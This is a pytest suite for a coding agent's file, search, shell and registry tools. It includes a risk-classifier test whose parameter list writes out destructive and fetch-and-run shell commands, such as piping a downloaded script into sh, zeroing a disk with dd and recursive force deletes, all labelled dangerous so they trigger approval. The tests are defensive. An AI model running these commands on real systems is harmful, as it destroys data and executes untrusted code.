"""File, search, shell, truncation, and registry behaviour.

The recurring theme: a bounded answer that says what it left out, and a failure
that tells the model enough to recover. Both matter more than the happy path,
because the happy path is what the model already expects.
"""

from __future__ import annotations

import os
import shutil
import sys
import time
from pathlib import Path
from typing import Annotated

import pytest

from cagent.errors import ToolNotFoundError
from cagent.tools import search as search_module
from cagent.tools import shell as shell_module
from cagent.tools.base import ToolContext, ToolOutcome
from cagent.tools.files import ListDirTool, ReadFileTool, WriteFileParams, WriteFileTool
from cagent.tools.registry import ToolRegistry, default_registry, tool
from cagent.tools.schema import Doc
from cagent.tools.search import GlobFilesTool, GrepSearchTool
from cagent.tools.shell import (
    RunBashParams,
    RunBashTool,
    _build_invocation,
    _child_environment,
    classify_command,
    decode_subprocess_output,
)
from cagent.tools.truncation import truncate_output
from cagent.types import RiskLevel

SAFE, MUTATING, DANGEROUS = RiskLevel.SAFE, RiskLevel.MUTATING, RiskLevel.DANGEROUS


class TestReadFile:
    def test_lines_are_numbered_from_one(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("first\nsecond\n", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": "a.py"}, harness.ctx)
        assert "     1\tfirst" in outcome.content
        assert "     2\tsecond" in outcome.content

    def test_offset_and_limit_page_through_the_file(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("\n".join(f"line {n}" for n in range(1, 51)), "utf-8")
        outcome = ReadFileTool().invoke({"path": "a.py", "offset": 10, "limit": 3}, harness.ctx)
        assert "line 10" in outcome.content and "line 12" in outcome.content
        assert "line 13" not in outcome.content
        assert outcome.metadata["lines_shown"] == 3

    def test_remaining_lines_are_announced_with_the_next_offset(
        self, make_ctx, tmp_path: Path
    ) -> None:
        # Silence here reads to the model as "that was the whole file".
        harness = make_ctx()
        (tmp_path / "a.py").write_text("\n".join(str(n) for n in range(100)), "utf-8")
        outcome = ReadFileTool().invoke({"path": "a.py", "offset": 1, "limit": 10}, harness.ctx)
        assert "90 more lines" in outcome.content
        assert "offset=11" in outcome.content
        assert outcome.truncated

    def test_whole_small_file_reports_no_remainder(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("one\ntwo\n", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": "a.py"}, harness.ctx)
        assert "more lines" not in outcome.content and not outcome.truncated

    def test_a_very_long_line_is_clipped(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("x" * 5000 + "\n", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": "a.py"}, harness.ctx)
        assert "line truncated" in outcome.content

    def test_empty_file_says_so(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "empty.py").write_text("", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": "empty.py"}, harness.ctx)
        assert not outcome.is_error and outcome.content == "(empty file)"

    def test_missing_file_suggests_similar_names(self, make_ctx, tmp_path: Path) -> None:
        # A typo the model can see is a typo it fixes on the next turn.
        harness = make_ctx()
        (tmp_path / "widget.py").write_text("x = 1\n", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": "widgets.py"}, harness.ctx)
        assert outcome.is_error and "widget.py" in outcome.content

    def test_missing_file_with_no_neighbours_points_at_search_tools(
        self, make_ctx, tmp_path: Path
    ) -> None:
        harness = make_ctx()
        outcome = ReadFileTool().invoke({"path": "nothing_alike.py"}, harness.ctx)
        assert outcome.is_error
        assert "glob_files" in outcome.content or "list_dir" in outcome.content

    def test_directory_is_redirected_to_list_dir(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "pkg").mkdir()
        outcome = ReadFileTool().invoke({"path": "pkg"}, harness.ctx)
        assert outcome.is_error and "list_dir" in outcome.content

    def test_binary_file_is_refused(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "blob.bin").write_bytes(b"\x00\x01\x02")
        outcome = ReadFileTool().invoke({"path": "blob.bin"}, harness.ctx)
        assert outcome.is_error and "binary" in outcome.content.lower()

    def test_offset_past_the_end_explains_the_real_length(
        self, make_ctx, tmp_path: Path
    ) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("one\ntwo\n", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": "a.py", "offset": 99}, harness.ctx)
        assert outcome.is_error and "2 lines" in outcome.content

    def test_escaping_the_workspace_is_refused(self, make_ctx) -> None:
        harness = make_ctx()
        outcome = ReadFileTool().invoke({"path": "../../secrets.txt"}, harness.ctx)
        assert outcome.is_error

    def test_absolute_path_inside_the_workspace_is_allowed(
        self, make_ctx, tmp_path: Path
    ) -> None:
        harness = make_ctx()
        target = tmp_path / "a.py"
        target.write_text("ok\n", encoding="utf-8")
        outcome = ReadFileTool().invoke({"path": str(target)}, harness.ctx)
        assert not outcome.is_error and "ok" in outcome.content


class TestWriteFile:
    def test_creates_a_file_and_its_parents(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        outcome = WriteFileTool().invoke(
            {"path": "pkg/sub/new.py", "content": "x = 1\n"}, harness.ctx
        )
        assert not outcome.is_error, outcome.content
        assert (tmp_path / "pkg" / "sub" / "new.py").read_text(encoding="utf-8") == "x = 1\n"

    def test_overwrite_reports_a_diff(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("old\n", encoding="utf-8")
        outcome = WriteFileTool().invoke({"path": "a.py", "content": "new\n"}, harness.ctx)
        assert outcome.display is not None and "-old" in outcome.display
        assert "+1/-1" in outcome.content

    def test_new_file_approval_is_labelled_as_such(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        request = WriteFileTool().approval_request(
            WriteFileParams(path="fresh.py", content="a\nb\n"), harness.ctx
        )
        assert request is not None and "new file" in request.summary
        assert request.signature == "write_file:fresh.py"

    def test_overwrite_approval_shows_the_diff(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "a.py").write_text("old\n", encoding="utf-8")
        request = WriteFileTool().approval_request(
            WriteFileParams(path="a.py", content="new\n"), harness.ctx
        )
        assert request is not None and request.detail is not None
        assert "overwrite" in request.summary and "-old" in request.detail

    def test_a_directory_target_is_refused(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "pkg").mkdir()
        outcome = WriteFileTool().invoke({"path": "pkg", "content": "x"}, harness.ctx)
        assert outcome.is_error

    def test_writing_is_atomic_so_a_reader_never_sees_a_partial_file(
        self, make_ctx, tmp_path: Path
    ) -> None:
        harness = make_ctx()
        target = tmp_path / "a.py"
        target.write_text("original\n", encoding="utf-8")
        WriteFileTool().invoke({"path": "a.py", "content": "replaced\n"}, harness.ctx)
        # No leftover temporary files beside the target.
        assert [p.name for p in tmp_path.iterdir()] == ["a.py"]


class TestListDir:
    def test_tree_is_indented_with_dirs_first(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        (tmp_path / "zeta.py").write_text("", encoding="utf-8")
        (tmp_path / "alpha").mkdir()
        (tmp_path / "alpha" / "inner.py").write_text("", encoding="utf-8")
        outcome = ListDirTool().invoke({"path": ".", "depth": 2}, harness.ctx)
        lines = outcome.content.splitlines()
        assert lines[1].strip() == "alpha/"
        assert "  inner.py" in outcome.content
        assert lines.index("  alpha/") < lines.index("  zeta.py")

    def test_generated_directories_are_shown_but_not_expanded(
        self, make_ctx, tmp_path: Path
    ) -> None:
        # The model should know .git exists without seeing 400 objects.
        harness = make_ctx()
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "HEAD").write_text("ref\n", encoding="utf-8")
        outcome = ListDirTool().invoke({"path": "."}, harness.ctx)
        assert ".git/" in outcome.content and "HEAD" not in outcome.content

    def test_depth_is_respected(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        deep = tmp_path / "a" / "b" / "c"
        deep.mkdir(parents=True)
        (deep / "deep.py").write_text("", encoding="utf-8")
        outcome = ListDirTool().invoke({"path": ".", "depth": 1}, harness.ctx)
        assert "deep.py" not in outcome.content

    def test_entry_cap_is_announced(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        for n in range(30):
            (tmp_path / f"f{n}.py").write_text("", encoding="utf-8")
        outcome = ListDirTool().invoke({"path": ".", "max_entries": 5}, harness.ctx)
        assert "more entries omitted" in outcome.content and outcome.truncated

    def test_missing_directory_is_an_error(self, make_ctx) -> None:
        harness = make_ctx()
        assert ListDirTool().invoke({"path": "nowhere"}, harness.ctx).is_error


@pytest.fixture
def tree(tmp_path: Path) -> Path:
    """A small source tree with a generated directory to be skipped."""
    src = tmp_path / "src"
    src.mkdir()
    (src / "a.py").write_text("def alpha():\n    return 1\n\nclass Widget:\n    pass\n", "utf-8")
    (src / "b.py").write_text("from a import alpha\n\n\ndef beta():\n    return alpha()\n", "utf-8")
    (src / "notes.md").write_text("alpha is documented\n", encoding="utf-8")
    cache = src / "__pycache__"
    cache.mkdir()
    (cache / "junk.py").write_text("alpha\n", encoding="utf-8")
    return tmp_path


@pytest.fixture
def python_engine(monkeypatch) -> None:
    """Force the standard-library search engine, whatever the machine has."""
    real = shutil.which
    monkeypatch.setattr(
        shutil, "which", lambda name, *a, **k: None if name == "rg" else real(name, *a, **k)
    )


class TestSearchSymlinkSafety:
    def test_search_does_not_follow_a_symlink_outside_the_workspace(
        self, make_ctx, tmp_path: Path, python_engine
    ) -> None:
        outside = tmp_path.parent / "not-in-workspace.txt"
        outside.write_text("SECRET_OUTSIDE\n", encoding="utf-8")
        link = tmp_path / "linked.txt"
        try:
            link.symlink_to(outside)
        except OSError:
            pytest.skip("symlink creation is unavailable on this platform")

        harness = make_ctx()
        outcome = GrepSearchTool().invoke({"pattern": "SECRET_OUTSIDE"}, harness.ctx)
        assert "SECRET_OUTSIDE" not in outcome.content


class TestListDirSymlinkSafety:
    def test_list_does_not_traverse_a_symlinked_directory(
        self, make_ctx, tmp_path: Path
    ) -> None:
        outside = tmp_path.parent / "outside-tree"
        outside.mkdir()
        (outside / "secret.txt").write_text("secret\n", encoding="utf-8")
        link = tmp_path / "linked"
        try:
            link.symlink_to(outside, target_is_directory=True)
        except OSError:
            pytest.skip("symlink creation is unavailable on this platform")

        harness = make_ctx()
        outcome = ListDirTool().invoke({"path": ".", "depth": 3}, harness.ctx)
        assert "secret.txt" not in outcome.content
        assert "linked@" in outcome.content


class TestGrepSearch:
    def test_matches_are_path_line_text(self, make_ctx, tree: Path, python_engine) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke({"pattern": r"def \w+\(", "path": "src"}, harness.ctx)
        assert "a.py:1: def alpha():" in outcome.content
        assert outcome.metadata["engine"] == "python"

    def test_generated_directories_are_skipped(self, make_ctx, tree: Path, python_engine) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke({"pattern": "alpha", "path": "src"}, harness.ctx)
        assert "__pycache__" not in outcome.content

    def test_search_is_case_insensitive_by_default(
        self, make_ctx, tree: Path, python_engine
    ) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke({"pattern": "WIDGET", "path": "src"}, harness.ctx)
        assert "class Widget" in outcome.content

    def test_case_sensitivity_can_be_requested(
        self, make_ctx, tree: Path, python_engine
    ) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke(
            {"pattern": "WIDGET", "path": "src", "case_sensitive": True}, harness.ctx
        )
        assert "No matches" in outcome.content

    def test_glob_filter_restricts_the_files(self, make_ctx, tree: Path, python_engine) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke(
            {"pattern": "alpha", "path": "src", "glob": "*.py"}, harness.ctx
        )
        assert "notes.md" not in outcome.content and "a.py" in outcome.content

    def test_context_lines_use_a_dash_separator(
        self, make_ctx, tree: Path, python_engine
    ) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke(
            {"pattern": "return 1", "path": "src", "context": 1}, harness.ctx
        )
        assert "a.py:1- def alpha():" in outcome.content
        assert "a.py:2: " in outcome.content

    def test_no_matches_is_a_plain_answer_not_an_error(
        self, make_ctx, tree: Path, python_engine
    ) -> None:
        # "Nothing found" is a result the model must be able to trust.
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke({"pattern": "zzz_absent", "path": "src"}, harness.ctx)
        assert not outcome.is_error and "No matches" in outcome.content
        assert outcome.metadata["matches"] == 0

    def test_result_cap_is_announced(self, make_ctx, tree: Path, python_engine) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke(
            {"pattern": "a", "path": "src", "max_results": 2}, harness.ctx
        )
        assert "capped at 2 results" in outcome.content and outcome.truncated

    def test_invalid_regex_quotes_the_error(self, make_ctx, tree: Path, python_engine) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke({"pattern": "(unclosed", "path": "src"}, harness.ctx)
        assert outcome.is_error
        assert "not a valid regular expression" in outcome.content

    def test_a_single_file_can_be_searched(self, make_ctx, tree: Path, python_engine) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GrepSearchTool().invoke({"pattern": "alpha", "path": "src/a.py"}, harness.ctx)
        assert "a.py:1:" in outcome.content

    def test_ripgrep_output_is_parsed_identically(self, make_ctx, tree: Path, monkeypatch) -> None:
        # The two engines must be interchangeable, so the same query is run
        # through a stand-in ripgrep and compared with the fallback's output.
        import subprocess

        real_which = shutil.which
        harness = make_ctx(workspace=tree)
        query = {"pattern": "return 1", "path": "src", "context": 1}

        monkeypatch.setattr(
            shutil, "which", lambda n, *a, **k: None if n == "rg" else real_which(n, *a, **k)
        )
        expected = GrepSearchTool().invoke(dict(query), harness.ctx)

        cs = search_module._CONTEXT_SEP
        ms = search_module._MATCH_SEP
        canned = (
            f"a.py{cs}1{cs}def alpha():\n"
            f"a.py{ms}2{ms}    return 1\n"
            f"a.py{cs}3{cs}\n"
        )

        def fake_run(argv, **kwargs):
            assert argv[0] == "rg"
            assert f"--field-match-separator={ms}" in argv
            assert "--no-config" in argv and "--no-follow" in argv
            return subprocess.CompletedProcess(argv, 0, canned, "")

        monkeypatch.setattr(
            shutil, "which", lambda n, *a, **k: "/usr/bin/rg" if n == "rg" else real_which(n)
        )
        monkeypatch.setattr(search_module.subprocess, "run", fake_run)
        actual = GrepSearchTool().invoke(dict(query), harness.ctx)

        assert actual.metadata["engine"] == "ripgrep"
        assert actual.content == expected.content

    def test_a_context_line_containing_a_line_reference_is_not_misread(self) -> None:
        # The reason the separators are control characters: with ripgrep's
        # defaults this line is indistinguishable from a match.
        cs = search_module._CONTEXT_SEP
        parsed = search_module._parse_ripgrep_line(f"a.py{cs}7{cs}log('b.py:42: oops')")
        assert parsed == ("a.py", "7", "log('b.py:42: oops')", False)


class TestGlobFiles:
    def test_glob_does_not_follow_a_symlink_outside_the_workspace(
        self, make_ctx, tmp_path: Path
    ) -> None:
        outside = tmp_path.parent / "outside-glob"
        outside.mkdir()
        (outside / "secret.py").write_text("SECRET_OUTSIDE\n", encoding="utf-8")
        link = tmp_path / "linked"
        try:
            link.symlink_to(outside, target_is_directory=True)
        except OSError:
            pytest.skip("symlink creation is unavailable on this platform")

        harness = make_ctx()
        outcome = GlobFilesTool().invoke({"pattern": "linked/*.py"}, harness.ctx)
        assert "secret.py" not in outcome.content

    def test_matches_are_listed_with_sizes(self, make_ctx, tree: Path) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GlobFilesTool().invoke({"pattern": "**/*.py", "path": "src"}, harness.ctx)
        assert "a.py" in outcome.content and "b.py" in outcome.content

    def test_generated_directories_are_skipped(self, make_ctx, tree: Path) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GlobFilesTool().invoke({"pattern": "**/*.py", "path": "src"}, harness.ctx)
        assert "junk.py" not in outcome.content

    def test_results_are_newest_first(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx()
        old, new = tmp_path / "old.py", tmp_path / "new.py"
        old.write_text("", encoding="utf-8")
        new.write_text("", encoding="utf-8")
        import os

        os.utime(old, (1_600_000_000, 1_600_000_000))
        outcome = GlobFilesTool().invoke({"pattern": "*.py"}, harness.ctx)
        lines = outcome.content.splitlines()
        assert "new.py" in lines[0] and "old.py" in lines[1]

    def test_no_matches_is_a_plain_answer(self, make_ctx, tree: Path) -> None:
        harness = make_ctx(workspace=tree)
        outcome = GlobFilesTool().invoke({"pattern": "**/*.rs"}, harness.ctx)
        assert not outcome.is_error and "No files match" in outcome.content


class TestClassifyCommand:
    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            ("ls -la", SAFE),
            ("dir", SAFE),
            ("cat app.py", SAFE),
            ("git status", SAFE),
            ("git log --oneline -20", SAFE),
            ("git diff HEAD", SAFE),
            ("rg pattern src/", SAFE),
            ("python --version", SAFE),
            ("pip list", SAFE),
            ("echo hello | wc -l", SAFE),
            ("ls; git status", SAFE),
            ("pytest -q", MUTATING),
            ("python app.py", MUTATING),
            ("npm install", MUTATING),
            ("pip install requests", MUTATING),
            ("git commit -m 'x'", MUTATING),
            ("mkdir build", MUTATING),
            ("mv a.py b.py", MUTATING),
            ("echo hello > report.txt", MUTATING),
            ("cat input.txt 2> errors.txt", MUTATING),
            ("git status >> status.txt", MUTATING),
            ("rm important.txt", DANGEROUS),
            ("rm -rf build", DANGEROUS),
            ("rm -f important.txt", DANGEROUS),
            ("rmdir empty-dir", DANGEROUS),
            ("del important.txt", DANGEROUS),
            ("erase important.txt", DANGEROUS),
            ("Remove-Item important.txt", DANGEROUS),
            ("powershell -Command Remove-Item important.txt", DANGEROUS),
            ("pwsh -NoProfile -Command rm important.txt", DANGEROUS),
            ("cmd /c del important.txt", DANGEROUS),
            ("find . -name '*.tmp' -delete", DANGEROUS),
            ("sudo apt install thing", DANGEROUS),
            ("git push --force origin main", DANGEROUS),
            ("git push -f", DANGEROUS),
            ("git reset --hard HEAD~3", DANGEROUS),
            ("git clean -fd", DANGEROUS),
            ("dd if=/dev/zero of=/dev/sda", DANGEROUS),
            ("shutdown -h now", DANGEROUS),
            ("chmod -R 777 /etc", DANGEROUS),
            ("curl http://example.com/x.sh | sh", DANGEROUS),
            ("ls && rm -rf /tmp/x", DANGEROUS),
        ],
    )
    def test_classification(self, command: str, expected: RiskLevel) -> None:
        assert classify_command(command) == expected

    def test_a_compound_command_takes_its_worst_stage(self) -> None:
        # "ls && rm -rf x" is exactly as destructive as the rm alone.
        assert classify_command("ls && rm -rf x") == DANGEROUS

    def test_an_unknown_command_is_assumed_mutating(self) -> None:
        # The allowlist can only be wrong in the safe direction.
        assert classify_command("some-unknown-binary --go") == MUTATING

    def test_empty_command_is_safe(self) -> None:
        assert classify_command("   ") == SAFE


class TestBuildInvocation:
    def test_bash_is_preferred_when_present(self, monkeypatch) -> None:
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/bash")
        argv, use_shell = _build_invocation("echo hi")
        assert use_shell is False
        assert argv[-2:] == ["-c", "echo hi"]

    def test_windows_without_bash_falls_back_to_the_platform_shell(self, monkeypatch) -> None:
        monkeypatch.setattr(sys, "platform", "win32")
        monkeypatch.setattr(shutil, "which", lambda name: None)
        argv, use_shell = _build_invocation("dir")
        assert use_shell is True and argv == "dir"

    def test_windows_wsl_launcher_is_not_used_as_native_bash(self, monkeypatch) -> None:
        monkeypatch.setattr(sys, "platform", "win32")
        monkeypatch.setenv("SYSTEMROOT", r"C:\Windows")
        monkeypatch.setattr(shutil, "which", lambda name: r"C:\Windows\System32\bash.exe")
        argv, use_shell = _build_invocation("python -V")
        assert use_shell is True and argv == "python -V"

    def test_windows_finds_bash_beside_git(self, monkeypatch) -> None:
        monkeypatch.setattr(sys, "platform", "win32")
        monkeypatch.setattr(
            shutil,
            "which",
            lambda name: None if name == "bash" else r"D:\Git\cmd\git.exe",
        )
        monkeypatch.setattr(os.path, "isfile", lambda path: path == r"D:\Git\bin\bash.exe")
        argv, use_shell = _build_invocation("echo hi")
        assert use_shell is False
        assert argv == [r"D:\Git\bin\bash.exe", "-c", "echo hi"]


class TestRunBash:
    def test_host_shell_is_unrestricted_with_workspace_only_file_tools(self, make_ctx) -> None:
        harness = make_ctx()
        outside = harness.ctx.workspace.parent / f"{harness.ctx.workspace.name}-outside.txt"
        try:
            outcome = RunBashTool().invoke(
                {"command": f'echo host-shell > "{outside}"'}, harness.ctx
            )
            assert not outcome.is_error, outcome.content
            assert outcome.metadata["shell_access"] == "host-unrestricted"
            assert outside.exists()
        finally:
            outside.unlink(missing_ok=True)

    def test_host_shell_still_classifies_and_requests_approval(self, make_ctx) -> None:
        harness = make_ctx()
        request = RunBashTool().approval_request(
            RunBashParams(command="rm -rf outside"), harness.ctx
        )
        assert request is not None
        assert request.risk is DANGEROUS

    def test_stdout_is_returned_with_the_exit_code(self, make_ctx) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        outcome = RunBashTool().invoke({"command": "echo hello-world"}, harness.ctx)
        assert not outcome.is_error, outcome.content
        assert "hello-world" in outcome.content and "exit code: 0" in outcome.content
        assert outcome.metadata["shell_access"] == "host-unrestricted"

    def test_python_output_is_utf8_on_every_platform(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        (tmp_path / "unicode_output.py").write_text(
            "print('中文路径')\n", encoding="utf-8"
        )
        outcome = RunBashTool().invoke({"command": "python unicode_output.py"}, harness.ctx)
        assert not outcome.is_error, outcome.content
        assert "中文路径" in outcome.content

    def test_native_output_falls_back_to_the_platform_encoding(self, monkeypatch) -> None:
        monkeypatch.setattr(
            shell_module.locale, "getencoding", lambda: "gbk"
        )
        assert decode_subprocess_output("中文路径".encode("gbk")) == "中文路径"

    def test_child_environment_forces_python_utf8(self, monkeypatch) -> None:
        monkeypatch.setenv("PYTHONUTF8", "0")
        environment = _child_environment()
        assert environment["PYTHONUTF8"] == "1"
        assert environment["PYTHONIOENCODING"] == "utf-8"
        assert environment["PATH"].split(os.pathsep)[0] == str(Path(sys.executable).parent)

    def test_a_failing_command_returns_stderr_rather_than_raising(
        self, make_ctx, tmp_path: Path
    ) -> None:
        # This is the self-correction path: the model needs the traceback.
        harness = make_ctx(allow_outside_workspace=True)
        (tmp_path / "boom.py").write_text(
            "import sys\nsys.stderr.write('kaboom\\n')\nsys.exit(3)\n", encoding="utf-8"
        )
        outcome = RunBashTool().invoke({"command": "python boom.py"}, harness.ctx)
        assert outcome.is_error
        assert "exit code: 3" in outcome.content and "kaboom" in outcome.content
        assert outcome.metadata["exit_code"] == 3

    def test_commands_run_in_the_workspace(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        (tmp_path / "marker.txt").write_text("here\n", encoding="utf-8")
        outcome = RunBashTool().invoke({"command": "cat marker.txt"}, harness.ctx)
        assert "here" in outcome.content

    def test_credential_looking_variables_are_withheld(self, make_ctx, monkeypatch) -> None:
        # The model can run `env`, and whatever it prints lands in the transcript
        # and the trace file.
        harness = make_ctx(allow_outside_workspace=True)
        monkeypatch.setenv("MY_SECRET_API_KEY", "sk-must-not-appear")
        monkeypatch.setenv("HARMLESS_SETTING", "visible-value")
        outcome = RunBashTool().invoke({"command": "env"}, harness.ctx)
        assert "sk-must-not-appear" not in outcome.content
        assert "visible-value" in outcome.content

    def test_an_edit_is_never_verified_against_stale_bytecode(
        self, make_ctx, tmp_path: Path
    ) -> None:
        # Python treats a cached .pyc as current based on the source's mtime in
        # whole seconds plus its size. Changing "a - b" to "a + b" alters
        # neither, so without PYTHONDONTWRITEBYTECODE a re-run inside the same
        # second executes the old bytecode and reports the bug as unfixed —
        # which would send the agent off to "fix" already-correct code.
        harness = make_ctx(allow_outside_workspace=True)
        (tmp_path / "calc.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
        (tmp_path / "check.py").write_text(
            "from calc import add\nassert add(2, 3) == 5, 'still broken'\nprint('OK')\n",
            encoding="utf-8",
        )

        first = RunBashTool().invoke({"command": "python check.py"}, harness.ctx)
        assert first.is_error, "the fixture bug did not fail"

        (tmp_path / "calc.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
        second = RunBashTool().invoke({"command": "python check.py"}, harness.ctx)

        assert not second.is_error, second.content
        assert "OK" in second.content
        assert not (tmp_path / "__pycache__").exists()

    def test_timeout_is_reported_as_an_outcome(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        (tmp_path / "hang.py").write_text("import time\ntime.sleep(30)\n", encoding="utf-8")
        started = time.perf_counter()
        outcome = RunBashTool().invoke({"command": "python hang.py", "timeout": 1}, harness.ctx)
        elapsed = time.perf_counter() - started
        assert outcome.is_error and "timed out" in outcome.content
        assert outcome.metadata["timeout"] is True
        assert outcome.metadata["exit_code"] is None
        assert elapsed < 15, f"took {elapsed:.1f}s to abandon a 1s timeout"

    def test_long_output_is_truncated_and_says_so(self, make_ctx, tmp_path: Path) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        (tmp_path / "noisy.py").write_text("for i in range(3000): print(i)\n", encoding="utf-8")
        outcome = RunBashTool().invoke({"command": "python noisy.py"}, harness.ctx)
        assert outcome.truncated and "lines omitted" in outcome.content

    def test_an_empty_command_is_refused(self, make_ctx) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        assert RunBashTool().invoke({"command": "   "}, harness.ctx).is_error

    def test_a_read_only_command_needs_no_approval(self, make_ctx) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        assert RunBashTool().approval_request(RunBashParams(command="ls -la"), harness.ctx) is None

    def test_a_mutating_command_can_be_remembered_by_program(self, make_ctx) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        request = RunBashTool().approval_request(
            RunBashParams(command="pytest -q tests/", description="run the tests"), harness.ctx
        )
        assert request is not None and request.risk is MUTATING
        assert request.signature == "run_bash:pytest"
        assert "run the tests" in request.summary

    def test_a_dangerous_command_signs_on_its_full_text(self, make_ctx) -> None:
        # So approving one `rm -rf` can never pre-approve a different one.
        harness = make_ctx(allow_outside_workspace=True)
        request = RunBashTool().approval_request(
            RunBashParams(command="rm -rf build"), harness.ctx
        )
        assert request is not None and request.risk is DANGEROUS
        assert request.signature == "rm -rf build"

    def test_the_command_and_directory_are_shown_for_review(self, make_ctx, tmp_path) -> None:
        harness = make_ctx(allow_outside_workspace=True)
        request = RunBashTool().approval_request(
            RunBashParams(command="pytest -q"), harness.ctx
        )
        assert request is not None and request.detail is not None
        assert "pytest -q" in request.detail

    def test_an_already_aborted_run_does_not_launch_anything(self, make_ctx) -> None:
        harness = make_ctx()
        harness.ctx.abort.set()
        outcome = RunBashTool().invoke({"command": "echo should-not-run"}, harness.ctx)
        assert outcome.is_error and "should-not-run" not in outcome.content


class TestTruncateOutput:
    def test_short_text_is_returned_unchanged(self) -> None:
        text, truncated = truncate_output("a\nb\n", head_lines=10, tail_lines=10, max_chars=100)
        assert text == "a\nb\n" and truncated is False

    def test_both_ends_survive_and_the_count_is_exact(self) -> None:
        source = "\n".join(str(n) for n in range(100))
        text, truncated = truncate_output(source, head_lines=3, tail_lines=2, max_chars=10_000)
        assert truncated
        assert text.startswith("0\n1\n2")
        assert text.endswith("98\n99")
        assert "[95 lines omitted]" in text

    def test_the_character_budget_is_enforced_after_the_line_budget(self) -> None:
        source = "\n".join("x" * 500 for _ in range(50))
        text, truncated = truncate_output(source, head_lines=40, tail_lines=40, max_chars=1000)
        assert truncated and len(text) <= 1000

    def test_one_pathological_line_keeps_both_ends(self) -> None:
        # The tail is where a result usually is, so a prefix-only cut would lose it.
        source = "START" + "y" * 50_000 + "END"
        text, truncated = truncate_output(source, head_lines=5, tail_lines=5, max_chars=500)
        assert truncated and text.startswith("START") and text.endswith("END")

    def test_empty_input_is_untouched(self) -> None:
        assert truncate_output("", head_lines=5, tail_lines=5, max_chars=10) == ("", False)


class TestRegistry:
    def test_default_registry_exposes_the_expected_tools(self) -> None:
        assert set(default_registry().names()) == {
            "read_file",
            "write_file",
            "edit_file",
            "multi_edit",
            "list_dir",
            "glob_files",
            "grep_search",
            "run_bash",
        }

    def test_every_tool_produces_a_valid_schema(self) -> None:
        # Catches a malformed Params dataclass before the model ever sees it.
        for spec in default_registry().specs():
            assert spec.description, spec.name
            assert spec.input_schema["type"] == "object"
            assert "properties" in spec.input_schema

    def test_registering_a_duplicate_name_is_refused(self) -> None:
        registry = ToolRegistry()
        registry.register_class(ReadFileTool)
        with pytest.raises(Exception):  # noqa: B017  # any refusal is acceptable
            registry.register_class(ReadFileTool)

    def test_an_unknown_name_suggests_the_nearest_ones(self) -> None:
        registry = default_registry()
        with pytest.raises(ToolNotFoundError) as caught:
            registry.get("read_fil")
        assert "read_file" in caught.value.as_model_feedback()

    def test_a_disabled_tool_leaves_the_advertised_set_but_stays_gettable(self) -> None:
        registry = default_registry()
        registry.disable("run_bash")
        assert "run_bash" not in {spec.name for spec in registry.specs()}
        assert registry.get("run_bash") is not None
        registry.enable("run_bash")
        assert "run_bash" in {spec.name for spec in registry.specs()}

    def test_subset_keeps_only_the_named_tools(self) -> None:
        subset = default_registry().subset(["read_file", "grep_search"])
        assert set(subset.names()) == {"read_file", "grep_search"}

    def test_decorator_builds_a_tool_from_a_function(self, make_ctx) -> None:
        @tool(risk=RiskLevel.SAFE)
        def shout(text: Annotated[str, Doc("what to shout")], times: int = 1) -> ToolOutcome:
            """Repeat text loudly.

            Args:
                text: what to shout
                times: how many times
            """
            return ToolOutcome.ok((text.upper() + "! ") * times)

        spec = shout.spec()
        assert spec.name == "shout"
        assert spec.description.startswith("Repeat text loudly")
        assert spec.input_schema["required"] == ["text"]
